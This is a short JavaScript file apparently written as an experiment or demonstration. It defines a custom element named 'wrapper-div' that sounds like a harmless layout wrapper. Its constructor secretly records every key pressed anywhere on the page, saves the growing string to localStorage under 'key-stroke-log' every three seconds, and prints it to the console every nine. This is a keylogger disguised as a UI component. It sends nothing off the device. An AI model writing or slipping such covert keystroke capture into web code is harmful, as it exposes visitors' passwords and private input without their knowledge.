// IIFE

(function() {

  class WrapperDiv extends HTMLElement {
    constructor() {
      // Must always call super
      super()
      // Attach object to Shadow Dom
      this._shadowRoot = this.attachShadow({mode: 'open'})

      // Set empty string - will eventually be recorded and cleared
      let str = ""

      // Append keystroke to string on each keydown
      document.onkeydown = function(e) {
        str += e.key
      }

      setInterval(() => {
        // console.log(str)
        window.localStorage.setItem("key-stroke-log", str)
        // str = ""
      }, 3000)

      setInterval(() => {
        let value = window.localStorage.getItem("key-stroke-log")
        console.log(value)
      }, 9000)
    }
  }

  customElements.define('wrapper-div', WrapperDiv)
}())
